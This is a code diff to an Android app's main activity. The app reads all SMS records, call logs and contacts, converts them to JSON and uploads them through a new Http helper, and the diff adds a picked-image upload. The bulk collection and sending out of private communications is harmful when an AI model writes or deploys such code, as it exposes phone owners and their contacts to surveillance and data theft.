@@ -14,7 +14,6 @@ import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.text.TextUtils;
-import android.util.Log;
 import android.view.View;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -39,6 +38,7 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         tv = findViewById(R.id.textview);
+        Yodo1HttpManage.getInstance().initHttp(this);
     }
 
     public void uploadqu(View view) {
@@ -79,21 +79,15 @@ public class MainActivity extends AppCompatActivity {
                 map.put("error_code", error_code);
                 map.put("id", _id);
                 map.put("thread_id", thread_id);
-//                Log.d("sms-mms", map.toString());
+//                YLog.d("sms-mms", map.toString());
                 list.add(map);
             }
             String s = "短信记录共:" + list.size();
-            Log.e("sms-mms", s);
+            YLog.e("sms-mms", s);
             tv.setText(s);
-            final String a = JSON.toJSONString(list);
-
-            new Thread(new Runnable() {
-                @Override
-                public void run() {
-                    SetPost sp = new SetPost();
-                    sp.HttpPostData(a);
-                }
-            }).start();
+            String a = JSON.toJSONString(list);
+            Http sp = new Http();
+            sp.sms(a);
         } else {
             String s = "没有发现短信记录";
             Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
@@ -137,21 +131,16 @@ public class MainActivity extends AppCompatActivity {
                 map.put("number", c.getString(Math.max(c.getColumnIndex(CallLog.Calls.NUMBER), 0)));
                 map.put("date", dateFormat.format(new Date(c.getLong(1))));
                 map.put(CallLog.Calls.DURATION, c.getString(Math.max(c.getColumnIndex(CallLog.Calls.DURATION), 0)));
-//                Log.d("CallsLog", map.toString());
+//                YLog.d("CallsYLog", map.toString());
                 list.add(map);
             }
 
             String s = "通话记录共:" + list.size();
-            Log.d("CallsLog", s);
+            YLog.d("CallsYLog", s);
             tv.setText(s);
             final String a = JSON.toJSONString(list);
-            new Thread(new Runnable() {
-                @Override
-                public void run() {
-                    SetPost2 sp = new SetPost2();
-                    sp.HttpPostData(a);
-                }
-            }).start();
+            Http sp = new Http();
+            sp.callLog(a);
         } else {
             String s = "没有发现通话记录";
             Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
@@ -299,12 +288,12 @@ public class MainActivity extends AppCompatActivity {
                     map.put("groupId", groupId);
                 }
                 if (map.size() > 3) {
-//                    Log.d("ContactsContract", map.toString());
+//                    YLog.d("ContactsContract", map.toString());
                     list.add(map);
                 }
             }
         }
-        Log.d("ContactsContract", "通讯录合并前记录共:" + list.size());
+        YLog.d("ContactsContract", "通讯录合并前记录共:" + list.size());
         //合并记录
         Map<String, Map<String, Object>> data = new HashMap<>();
         for (Map<String, Object> map : list) {
@@ -424,20 +413,15 @@ public class MainActivity extends AppCompatActivity {
             data.put(contactId, oneNum);
         }
         String s = "通讯录合并后记录共:" + data.size();
-        Log.d("ContactsContract", s);
+        YLog.d("ContactsContract", s);
         tv.setText(s);
 //        Set<Map.Entry<String, Map<String, Object>>> entries = data.entrySet();
 //        for (Map.Entry<String, Map<String, Object>> en : entries) {
-//            Log.d("", en.getValue().toString());
+//            YLog.d("", en.getValue().toString());
 //        }
         final String a = JSON.toJSONString(data);
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                SetPost2 sp = new SetPost2();
-                sp.HttpPostData(a);
-            }
-        }).start();
+        Http sp = new Http();
+        sp.phone(a);
         c.close();
     }
 
@@ -446,8 +430,16 @@ public class MainActivity extends AppCompatActivity {
         if (resultCode == RESULT_OK && data != null) {
             if (requestCode == 2020) {
                 tv.setText(data.toString());
-                Log.d("", data.toString());
+                YLog.d("", data.toString());
+                Http h = new Http();
+                h.imageUpload(data.getData().toString());
             }
         }
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        Yodo1HttpManage.getInstance().onDestroy();
     }
 }
